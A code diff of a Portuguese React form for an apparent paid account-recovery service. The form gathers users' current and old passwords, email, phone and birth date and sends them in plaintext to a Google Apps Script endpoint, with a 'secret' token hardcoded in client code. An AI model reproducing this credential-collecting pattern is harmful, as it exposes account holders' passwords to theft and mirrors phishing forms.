@@ -15,10 +15,6 @@
   <script type="text/babel">
     const { useState, useMemo, useEffect } = React;
 
-    // --- CONFIGURAÇÃO ---
-    const API_URL = "https://script.google.com/macros/s/AKfycbzDdFaGgzId6tCNVFgAcDodYH_FRq64OJkqHSMWXIpuYGZuD6CKwy9NQo9KaXLLu5rt2w/exec";
-    const TOKEN_SECRETO = "RecoveryPro2024!@#SuperSeguro";
-
     // --- ÍCONES ---
     const ShieldCheck = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>;
     const Instagram = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="20" x="2" y="2" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/></svg>;
@@ -32,6 +28,7 @@
       const [formData, setFormData] = useState({
         plataforma: '', usuario: '', emailVinculado: '', emailRecuperar: '', 
         ultimaSenha: '', telefone: '', temAcessoTelefone: null,
+        dataNascimento: { dia: '', mes: '', ano: '' },
         senhasAntigas: [''], nomeCliente: '', whatsapp: '',
         qtdSeguidores: '', motivoQueda: '', dataPerda: '',
         hackedEmailAlterado: null, suspendedReason: '',
@@ -47,14 +44,15 @@
       const [loading, setLoading] = useState(false);
       const [isSubmitted, setIsSubmitted] = useState(false);
 
+      // Máscaras e Formatações
       const applyPhoneMask = (v) => {
         if (!v) return "";
         v = v.replace(/\D/g, "");
         if (v.length > 11) v = v.slice(0, 11);
         if (v.length > 10) return v.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
-        else if (v.length > 5) return v.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
-        else if (v.length > 2) return v.replace(/(\d{2})(\d{0,5})/, "($1) $2");
-        else if (v.length > 0) return v.replace(/(\d{0,2})/, "($1");
+        if (v.length > 5) return v.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
+        if (v.length > 2) return v.replace(/(\d{2})(\d{0,5})/, "($1) $2");
+        if (v.length > 0) return v.replace(/(\d{0,2})/, "($1");
         return v;
       };
 
@@ -68,6 +66,7 @@
         return val.toLowerCase().replace(/[^a-z0-9._]/g, '').slice(0, 30);
       };
 
+      // Cálculo Probabilidade
       const probabilidade = useMemo(() => {
         if (!formData.plataforma) return 0;
         let score = 20; 
@@ -78,7 +77,7 @@
         if (formData.plataforma === 'insta') {
           if (formData.suspendedReason === 'Suspensão por 180 dias') score += 25;
           if (formData.motivoQueda === 'PERDEU A SENHA') score += 15;
-          if (formData.hackedEmailAlterado === 'nao') score score += 10;
+          if (formData.hackedEmailAlterado === 'nao') score += 10;
         }
         if (formData.senhasAntigas.filter(p => p.length > 3).length > 0) score += 15;
         return Math.min(score, 100);
@@ -89,19 +88,29 @@
         return Math.floor(count / 1000) * 10;
       }, [formData.payFollowersCount]);
 
+      // --- ENVIO FORMULÁRIO (CORRIGIDO) ---
       const handleSubmit = async (e) => {
         e.preventDefault();
         setLoading(true);
+
+        // Captura o indicador pela URL (ex: site.com/solicitar.html?ref=NOME)
+        const urlParams = new URLSearchParams(window.location.search);
+        const indicadoPor = urlParams.get('ref') || "";
+
+        // COLE A SUA URL DO APPS SCRIPT AQUI ABAIXO:
+        const API_URL = "https://script.google.com/macros/s/AKfycbxx9D_QOhsGhL7B9qowfIVNhKPomNo_iZmo1vF_x-BXwSnWs_1j734NPUZwDVmcrBImPA/exec";
         
         try {
           const payload = { 
-            token_secreto: TOKEN_SECRETO,
             ...formData, 
-            probabilidade: probabilidade + "%", 
-            descontoAplicado: "R$ " + discount + ",00",
+            probabilidade, 
+            descontoAplicado: discount,
+            indicadoPor: indicadoPor, // Preenche a Coluna M para o saldo
+            token_secreto: "RecoveryPro2024!@#SuperSeguro", // Validação de segurança
             dataEnvio: new Date().toLocaleString() 
           };
 
+          // Google Script requer mode: 'no-cors' para evitar erro de redirecionamento
           await fetch(API_URL, { 
             method: 'POST', 
             mode: 'no-cors', 
@@ -111,7 +120,7 @@
           setLoading(false);
           setIsSubmitted(true);
         } catch (error) {
-          alert("Erro ao enviar. Tente novamente.");
+          alert("Erro ao enviar solicitação. Verifique sua conexão.");
           setLoading(false);
         }
       };
@@ -124,7 +133,7 @@
                 <Check className="w-12 h-12 text-emerald-400" />
               </div>
               <h2 className="text-3xl font-bold mb-4">Solicitação Enviada!</h2>
-              <p className="text-slate-400 mb-8">Analisamos seu caso em instantes. Entraremos em contato pelo WhatsApp.</p>
+              <p className="text-slate-400 mb-8">Analisamos seu caso em instantes. Entraremos em contato via WhatsApp.</p>
               <button onClick={() => window.location.reload()} className="w-full py-4 bg-emerald-600 rounded-2xl font-bold">Voltar ao Início</button>
             </div>
           </div>
@@ -161,6 +170,8 @@
           )}
 
           <form onSubmit={handleSubmit} className="space-y-8 pb-32">
+            
+            {/* SELEÇÃO DE PLATAFORMA */}
             <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
               <h2 className="text-xl font-semibold mb-6">Selecione a plataforma:</h2>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
@@ -180,6 +191,8 @@
 
             {formData.plataforma && (
               <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
+                
+                {/* CAMPOS ESPECÍFICOS INSTAGRAM */}
                 {formData.plataforma === 'insta' && (
                   <>
                     <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
@@ -201,7 +214,12 @@
 
                     <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                       <h2 className="text-xl font-semibold mb-6">Quantidade de Seguidores</h2>
-                      <select required value={formData.qtdSeguidores} onChange={(e) => setFormData({...formData, qtdSeguidores: e.target.value})} className="w-full bg-slate-800 border-none p-4 rounded-xl appearance-none">
+                      <select 
+                        required
+                        value={formData.qtdSeguidores} 
+                        onChange={(e) => setFormData({...formData, qtdSeguidores: e.target.value})}
+                        className="w-full bg-slate-800 border-none p-4 rounded-xl appearance-none"
+                      >
                         <option value="">Selecione a faixa...</option>
                         {['0 a 10','10 a 100','100 a 500','500 a 1000','1000 a 2000','2000 a 4000','4000 a 8000','8000 a 16000','mais de 16.000'].map(range => (
                           <option key={range} value={range}>{range}</option>
@@ -211,6 +229,7 @@
                   </>
                 )}
 
+                {/* E-MAIL (Geral) */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-6">{formData.plataforma === 'google' ? 'Gmail a recuperar' : 'E-mail da Conta'}</h2>
                   <input 
@@ -219,7 +238,9 @@
                     value={formData.plataforma === 'google' ? formData.emailRecuperar : formData.emailVinculado} 
                     onChange={(e) => {
                       const val = e.target.value.replace(/\s/g, '');
-                      formData.plataforma === 'google' ? setFormData({...formData, emailRecuperar: val}) : setFormData({...formData, emailVinculado: val});
+                      formData.plataforma === 'google' 
+                        ? setFormData({...formData, emailRecuperar: val}) 
+                        : setFormData({...formData, emailVinculado: val});
                     }}
                     type="email" placeholder="email@exemplo.com" 
                     className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" 
@@ -231,12 +252,23 @@
                   )}
                 </section>
 
+                {/* MOTIVO QUEDA */}
                 {formData.plataforma === 'insta' && (
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                     <h2 className="text-xl font-semibold mb-6">O que aconteceu com a conta?</h2>
                     <div className="grid grid-cols-2 gap-3 mb-6">
-                      {['PERDEU A SENHA', 'CONTA SUSPENSA', 'CONTA HACKEADA', 'ERRO AO ENTRAR', 'NAO CHEGA CODIGOS'].map((motivo, idx) => (
-                        <button key={motivo} type="button" onClick={() => setFormData({...formData, motivoQueda: motivo})} className={`p-4 rounded-xl border-2 text-sm font-bold transition-all ${idx === 4 ? 'col-span-2' : ''} ${formData.motivoQueda === motivo ? 'border-indigo-500 bg-indigo-500/10' : 'border-slate-700 bg-slate-800/50 hover:border-slate-500'}`}>
+                      {[
+                        'PERDEU A SENHA', 
+                        'CONTA SUSPENSA', 
+                        'CONTA HACKEADA', 
+                        'ERRO AO ENTRAR', 
+                        'NAO CHEGA CODIGOS'
+                      ].map((motivo, idx) => (
+                        <button 
+                          key={motivo} type="button" 
+                          onClick={() => setFormData({...formData, motivoQueda: motivo})}
+                          className={`p-4 rounded-xl border-2 text-sm font-bold transition-all ${idx === 4 ? 'col-span-2' : ''} ${formData.motivoQueda === motivo ? 'border-indigo-500 bg-indigo-500/10' : 'border-slate-700 bg-slate-800/50 hover:border-slate-500'}`}
+                        >
                           {motivo}
                         </button>
                       ))}
@@ -256,9 +288,25 @@
                     {formData.motivoQueda === 'CONTA SUSPENSA' && (
                       <div className="mb-6">
                         <label className="text-sm block mb-2 text-slate-400 font-bold uppercase">O que aparece na tela?</label>
-                        <select value={formData.suspendedReason} onChange={(e) => setFormData({...formData, suspendedReason: e.target.value})} className="w-full bg-slate-800 border-none p-4 rounded-xl appearance-none">
+                        <select 
+                          value={formData.suspendedReason} 
+                          onChange={(e) => setFormData({...formData, suspendedReason: e.target.value})}
+                          className="w-full bg-slate-800 border-none p-4 rounded-xl appearance-none"
+                        >
                           <option value="">Selecione o aviso...</option>
-                          {["Detectamos atividade suspeita", "Não segue nossas diretrizes", "Confirme que esta conta é sua", "Nudez ou Atividade Sexual", "Direitos Autorais", "Fingir ser outra pessoa", "Suspensão por 180 dias", "Decisão Final"].map(reason => <option key={reason} value={reason}>{reason}</option>)}
+                          {[
+                            "Detectamos atividade suspeita em sua conta",
+                            "Não segue nossas diretrizes",
+                            "Ajude-nos a confirmar que esta conta é sua",
+                            "Nudez ou Atividade Sexual",
+                            "Propriedade Intelectual / Direitos Autorais",
+                            "Sua conta foi suspensa por fingir ser outra pessoa",
+                            "Suspensão por 180 dias",
+                            "Uso de Automação ou Compra de Seguidores",
+                            "Exploração Infantil (CSE / NCMEC)",
+                            "Organizações Perigosas ou Terrorismo",
+                            "Decisão Final - Esta conta não pode ser revisada"
+                          ].map(reason => <option key={reason} value={reason}>{reason}</option>)}
                         </select>
                       </div>
                     )}
@@ -266,17 +314,30 @@
                     {formData.motivoQueda && (
                       <div className="animate-in fade-in slide-in-from-top-2">
                         <label className="text-sm block mb-2 text-slate-400 font-bold uppercase">Data aproximada da perda:</label>
-                        <input type="date" value={formData.dataPerda} onChange={(e) => setFormData({...formData, dataPerda: e.target.value})} className="w-full bg-slate-800 border-none p-4 rounded-xl" />
+                        <input 
+                          type="date" 
+                          value={formData.dataPerda}
+                          onChange={(e) => setFormData({...formData, dataPerda: e.target.value})}
+                          className="w-full bg-slate-800 border-none p-4 rounded-xl" 
+                        />
                       </div>
                     )}
                   </section>
                 )}
 
+                {/* SEGURANÇA */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-6">Segurança</h2>
+                  
                   <div className="mb-6 relative">
                     <label className="text-xs font-bold text-slate-500 uppercase ml-2 mb-2 block">Última senha que lembra</label>
-                    <input disabled={naoLembra.ultimaSenha} value={formData.ultimaSenha} onChange={(e) => setFormData({...formData, ultimaSenha: e.target.value.replace(/\s/g, '')})} type={showPass ? 'text' : 'password'} placeholder="••••••••" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                    <input 
+                      disabled={naoLembra.ultimaSenha}
+                      value={formData.ultimaSenha}
+                      onChange={(e) => setFormData({...formData, ultimaSenha: e.target.value.replace(/\s/g, '')})}
+                      type={showPass ? 'text' : 'password'} placeholder="••••••••" 
+                      className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" 
+                    />
                     <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-4 top-[38px] text-slate-500">
                       {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                     </button>
@@ -287,10 +348,17 @@
 
                   <div className="mb-6">
                     <label className="text-xs font-bold text-slate-500 uppercase ml-2 mb-2 block">Telefone na conta</label>
-                    <input disabled={naoLembra.telefone} value={formData.telefone} onChange={(e) => setFormData({...formData, telefone: applyPhoneMask(e.target.value)})} type="text" placeholder="(XX) XXXXX-XXXX" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                    <input 
+                      disabled={naoLembra.telefone}
+                      value={formData.telefone}
+                      onChange={(e) => setFormData({...formData, telefone: applyPhoneMask(e.target.value)})}
+                      type="text" placeholder="(XX) XXXXX-XXXX" 
+                      className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" 
+                    />
                     <button type="button" onClick={() => setNaoLembra({...naoLembra, telefone: !naoLembra.telefone})} className="text-xs text-slate-500 mt-2 font-bold ml-2">
                       {naoLembra.telefone ? 'Lembrei' : 'Não tinha telefone'}
                     </button>
+
                     {formData.telefone.replace(/\D/g, '').length === 11 && (
                       <div className="mt-4 p-4 bg-slate-800/80 rounded-2xl animate-in zoom-in-95 duration-300">
                         <p className="text-sm font-bold mb-3">Você ainda tem acesso a este número?</p>
@@ -303,33 +371,54 @@
                   </div>
                 </section>
 
+                {/* SENHAS ANTIGAS */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <h2 className="text-xl font-semibold mb-4 text-indigo-400">Senhas Antigas</h2>
                   <p className="text-xs text-slate-500 mb-6">Adicionar senhas antigas aumenta drasticamente as chances de sucesso.</p>
                   <div className="space-y-3">
                     {formData.senhasAntigas.map((pass, idx) => (
-                      <input key={idx} value={pass} onChange={(e) => {
-                        const news = [...formData.senhasAntigas];
-                        news[idx] = e.target.value.replace(/\s/g, '');
-                        setFormData({...formData, senhasAntigas: news});
-                      }} type="text" placeholder={`Senha antiga ${idx + 1}`} className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
+                      <input 
+                        key={idx} value={pass} 
+                        onChange={(e) => {
+                          const news = [...formData.senhasAntigas];
+                          news[idx] = e.target.value.replace(/\s/g, '');
+                          setFormData({...formData, senhasAntigas: news});
+                        }} 
+                        type="text" placeholder={`Senha antiga ${idx + 1}`} 
+                        className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" 
+                      />
                     ))}
                     <button type="button" onClick={() => setFormData({...formData, senhasAntigas: [...formData.senhasAntigas, '']})} className="w-full py-3 border-2 border-dashed border-slate-700 rounded-xl text-slate-500 hover:text-indigo-400 font-bold text-xs"> + ADICIONAR SENHA</button>
                   </div>
                 </section>
 
+                {/* MEIO JURÍDICO */}
                 {formData.plataforma === 'insta' && (
                   <section className="bg-indigo-900/20 border-2 border-indigo-500/50 p-6 md:p-8 rounded-[2.5rem]">
                     <div className="flex items-start gap-4 mb-6">
-                      <input type="checkbox" id="juridico" checked={formData.juridicoChecked} onChange={(e) => setFormData({...formData, juridicoChecked: e.target.checked})} className="mt-1 w-6 h-6 rounded border-slate-700 text-indigo-600 focus:ring-indigo-500" />
+                      <input 
+                        type="checkbox" id="juridico"
+                        checked={formData.juridicoChecked}
+                        onChange={(e) => setFormData({...formData, juridicoChecked: e.target.checked})}
+                        className="mt-1 w-6 h-6 rounded border-slate-700 text-indigo-600 focus:ring-indigo-500"
+                      />
                       <label htmlFor="juridico" className="text-sm font-medium cursor-pointer leading-relaxed">
                         Caso não seja possível de forma tradicional, permito de meios jurídicos recuperar a conta <span className="text-indigo-400 font-semibold">@{formData.usuario || "usuario"}</span>. Entendo que <span className="text-emerald-400">só pagarei quando a conta estiver 100% recuperada</span>.
                       </label>
                     </div>
+
                     {formData.juridicoChecked && (
                       <div className="space-y-3 animate-in slide-in-from-left-4">
-                        {[{ val: '150', text: 'R$ 150,00 - Tempo previsto até 28 dias' }, { val: '200', text: 'R$ 200,00 - Tempo previsto até 14 dias' }, { val: '250', text: 'R$ 250,00 - Tempo previsto até 7 dias' }].map(opt => (
-                          <button key={opt.val} type="button" onClick={() => setFormData({...formData, juridicoOption: opt.val})} className={`w-full p-4 text-left rounded-xl border-2 font-bold text-xs transition-all ${formData.juridicoOption === opt.val ? 'border-emerald-500 bg-emerald-500/10' : 'border-slate-700'}`}>
+                        {[
+                          { val: '150', text: 'R$ 150,00 - Tempo previsto até 28 dias' },
+                          { val: '200', text: 'R$ 200,00 - Tempo previsto até 14 dias' },
+                          { val: '250', text: 'R$ 250,00 - Tempo previsto até 7 dias' }
+                        ].map(opt => (
+                          <button 
+                            key={opt.val} type="button"
+                            onClick={() => setFormData({...formData, juridicoOption: opt.val})}
+                            className={`w-full p-4 text-left rounded-xl border-2 font-bold text-xs transition-all ${formData.juridicoOption === opt.val ? 'border-emerald-500 bg-emerald-500/10' : 'border-slate-700'}`}
+                          >
                             {opt.text}
                           </button>
                         ))}
@@ -338,29 +427,46 @@
                   </section>
                 )}
 
+                {/* PAGAR COM SEGUIDORES */}
                 <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
                   <div className="flex items-start gap-4 mb-4">
-                    <input type="checkbox" id="payFollow" checked={formData.payWithFollowers} onChange={(e) => setFormData({...formData, payWithFollowers: e.target.checked})} className="mt-1 w-6 h-6 rounded border-slate-700 text-indigo-600 focus:ring-indigo-500" />
+                    <input 
+                      type="checkbox" id="payFollow"
+                      checked={formData.payWithFollowers}
+                      onChange={(e) => setFormData({...formData, payWithFollowers: e.target.checked})}
+                      className="mt-1 w-6 h-6 rounded border-slate-700 text-indigo-600 focus:ring-indigo-500"
+                    />
                     <div>
                       <label htmlFor="payFollow" className="text-sm font-medium block">Permito pagar uma parte com seguidores</label>
                       <p className="text-[10px] text-slate-500 mt-1">A cada 1.000 seguidores da sua conta, economize R$ 10,00 nos divulgando.</p>
                     </div>
                   </div>
+
                   {formData.payWithFollowers && (
                     <div className="mt-4 p-4 bg-slate-800 rounded-2xl animate-in zoom-in-95">
-                      <label className="text-xs font-bold text-slate-400 mb-2 block">Quantos seguidores na conta reserva?</label>
-                      <input type="text" value={formData.payFollowersCount} onChange={(e) => setFormData({...formData, payFollowersCount: formatNumber(e.target.value)})} placeholder="Ex: 2.800" className="w-full bg-slate-900 border-none p-4 rounded-xl text-xl font-bold text-emerald-400" />
-                      {discount > 0 && <p className="mt-2 text-sm font-bold text-emerald-500">Economia calculada: - R$ {discount},00</p>}
+                      <label className="text-xs font-bold text-slate-400 mb-2 block">Quantos seguidores você tem na conta reserva?</label>
+                      <input 
+                        type="text" 
+                        value={formData.payFollowersCount}
+                        onChange={(e) => setFormData({...formData, payFollowersCount: formatNumber(e.target.value)})}
+                        placeholder="Ex: 2.800"
+                        className="w-full bg-slate-900 border-none p-4 rounded-xl text-xl font-bold text-emerald-400"
+                      />
+                      {discount > 0 && (
+                        <p className="mt-2 text-sm font-bold text-emerald-500">Economia calculada: - R$ {discount},00</p>
+                      )}
                     </div>
                   )}
                 </section>
 
+                {/* AVISO SEGURANÇA */}
                 <div className="bg-blue-900/20 border border-blue-500/30 p-4 rounded-2xl">
                   <p className="text-[10px] font-bold text-blue-400 text-center uppercase tracking-widest leading-tight">
                     A LFAssessoria nunca solicita pagamentos antecipados via Pix para funcionários individuais. Todo o processo é documentado.
                   </p>
                 </div>
 
+                {/* FINALIZAÇÃO */}
                 <section className="bg-slate-900 border-2 border-indigo-500/50 p-6 md:p-8 rounded-[2.5rem] shadow-2xl">
                   <h2 className="text-xl font-semibold mb-6">Finalizar Solicitação</h2>
                   <div className="grid md:grid-cols-2 gap-4">
@@ -371,6 +477,7 @@
                     {loading ? <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : "ENVIAR SOLICITAÇÃO"}
                   </button>
                 </section>
+
               </div>
             )}
           </form>
